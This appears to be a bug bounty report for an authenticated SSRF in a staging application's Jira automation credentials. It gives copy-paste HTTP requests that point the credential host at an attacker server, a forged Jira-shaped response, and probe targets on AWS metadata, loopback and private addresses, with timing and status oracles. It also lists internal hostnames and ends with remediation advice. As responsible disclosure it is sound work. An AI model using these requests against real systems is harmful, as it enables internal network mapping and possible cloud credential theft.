# BUG-012: Full-read SSRF via attacker-controlled `host` in Jira automation credentials (CWE-918)

**Status:** CONFIRMED (full content readback + internal reachability oracle + POST-SSRF). Ready to submit.
**Severity recommendation:** **P2**
**Target:** `https://bugbounty1.qe.optrostaging.ai` — AuditBoard QE staging
**Reporter:** zeno0 (user 230), token header auth
**Discovered:** 2026-11-07 (session u)

## Summary

An authenticated user can create an **Automation Credential** of type `jira` whose `data.host` is an **arbitrary attacker-controlled URL** — there is no scheme, host or IP allowlist. A backend integration service (Node.js/axios, `integrations.qa.soxhubapp.com` fleet) then makes server-side HTTP requests to that host during credential **verification**, **project listing** and **webhook registration**:

1. **Full-read SSRF:** `GET /api/v1/ticketing/projects?credentialId=<id>` fetches `{host}/rest/api/3/project/search?startAt=0&maxResults=50`, parses the response as Jira projects and **returns the parsed content to the client**. Pointing the host at an attacker-controlled server and answering with Jira-shaped JSON returns attacker-supplied values as real `projects` (proof below).
2. **Internal reachability oracle:** `host` values on AWS link-local metadata (`http://169.254.169.254/...`) are **fetched** — the request returns in ~0.5 s with a distinct `401 ApiError` (IMDSv2 rejecting tokenless GET), versus `500` generic for connection-refused (`127.0.0.1:9002`) and an **indefinite hang** for blackholed RFC1918 targets (`172.31.0.1`, `10.255.255.1`). This differentiates open/closed/filtered internal targets.
3. **Persisted status-code oracle:** each verification stores the remote response status in the credential record (`last_verified = {'type':'warning','results':[{'status': 200}], ...}`), readable afterwards via `GET /api/v1/automation_credentials/{id}`.
4. **POST-based SSRF / internal URL disclosure:** during setup the service sends `POST {host}/rest/webhooks/1.0/webhook` whose body leaks the internal integration host and callback route (`https://integrations.qa.soxhubapp.com/api/v1/jira/credential/{id}/issues/{issue.key}?instanceUrl=...`) plus a full event list.

## Reproduction (copy-paste)

### Step 1 — create a jira credential with attacker host

```
POST /api/v1/automation_credentials HTTP/1.1
Host: bugbounty1.qe.optrostaging.ai
token: <id>:<secret>
X-Optro-Bug-Bounty: zeno0
X-Auditboard-Product: System
Content-Type: application/json

{"automation_credential":{"name":"zx-ssrf-probe","handler_type":"jira","type":"jira","data":{"host":"https://<attacker-server>/t049e-cred-host","type":"jira","email":"attacker@example.com","apiToken":"ZxProbeToken123"}}}
```

Response 200: `{"automation_credentials":[{"id":61, "features":{"genericTicketing":true, ...}}]}`

### Step 2 — full-read readback (attacker server answers as Jira)

Attacker server responds to any request with:

```json
{"isLast":true,"values":[{"id":"10001","key":"ZXSSRF","name":"ZX SSRF Readback Project","avatarUrls":{},"self":"https://zx.example/jira"}],"self":"https://zx.example","total":1,"maxResults":50,"startAt":0}
```

```
GET /api/v1/ticketing/projects?credentialId=61 HTTP/1.1
Host: bugbounty1.qe.optrostaging.ai
token: <id>:<secret>
X-Optro-Bug-Bounty: zeno0
X-Auditboard-Product: System
Accept: application/json
```

Response 200 — **attacker-controlled content returned as application data:**

```json
{"projects":[{"id":"10001","name":"ZX SSRF Readback Project","description":"ZXSSRF"}]}
```

Server-side request observed on the attacker server (exact):

```
GET /t049e-cred-host/rest/api/3/project/search?startAt=0&maxResults=50   UA: axios/1.20.0
POST /t049e-cred-host/rest/webhooks/1.0/webhook                          UA: node
```

### Step 3 — internal reachability oracle

| `data.host` | Result of `GET /ticketing/projects?credentialId=` |
| --- | --- |
| `http://169.254.169.254/latest/meta-data/` | **401 ApiError in ~0.51 s** (IMDS reached; IMDSv2 rejects tokenless GET) |
| `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | **401 ApiError in ~0.49 s** |
| `http://127.0.0.1:9002/` | 500 generic in ~0.49 s (connection refused) |
| `http://172.31.0.1/`, `http://10.255.255.1/` | request **hangs** (no route — blackholed) |
| `https://<attacker>/...` + Jira-shaped JSON | 200 + parsed content readback |

## Impact

- **Authenticated full-read SSRF (CWE-918):** any user who can create automation credentials can make an internal integration service issue GET/POST requests to arbitrary URLs and read parsed response content back through the API.
- **Internal service discovery:** error-code and timing differentials (401 vs 500 vs hang) turn the endpoint into an internal port/service scanner from inside the VPC. AWS link-local metadata is reachable; IMDSv2 currently blocks credential theft, but the hop-by-hop reachability confirms the integration service sits in a metadata-accessible network segment.
- **Cross-protocol/POST SSRF:** webhook registration POSTs attacker-visited bodies (methods beyond GET).
- **Chaining potential:** combined with any internal service that emits JSON shaped `{"values":[...]}` (or error text surfaced in `last_verified`), readback extends beyond attacker hosts. The leaked `integrations.qa.soxhubapp.com` webhook callback route expands the internal attack map for chained SSRF.

## Constraints observed (stated honestly)

- RFC1918 app-tier targets tested were blackholed (no lateral readback demonstrated into the app/data tier).
- IMDSv2 enforced (token requires PUT + custom header; GET returns 401) — no instance-credential theft demonstrated.
- Readback is shaped by the Jira parser (`projects[].id/name/description` fields surfaced); arbitrary content readback was demonstrated from attacker-controlled servers, not from arbitrary internal endpoints.

## Remediation suggestions

1. Validate `data.host` server-side at credential create/update: allowlist `https` scheme + customer/vendor domains; reject link-local (169.254.0.0/16, fd00:ec2::254), loopback, RFC1918 and metadata endpoints (DNS-rebinding-safe resolution).
2. Run the integration service in an egress-restricted subnet (no IMDS route, egress allowlist via proxy).
3. Do not persist raw remote status/error detail in `last_verified`; return generic verification results.
4. Remove the generic credential-create permission from non-admin roles where ticketing integrations are admin-managed.

## Tester artifacts (disclosure)

Test credentials created for this PoC remain because the API exposes no delete route (`DELETE /api/v1/automation_credentials/{id}` → 404): ids **61** (`t049e-zx-probe`, host = webhook.site), **62/63** (`t049f-imds-*`), **64** (`t049f-localhost-9002`). They are inert (webhook.site channels expire; internal hosts point at IMDS/loopback). Vendor should remove them; ~40 similar artifacts from other testers already exist in this org (`ssrf-test`, `poc-imds`, `poc-redis`, `poc-k8s`, ...).
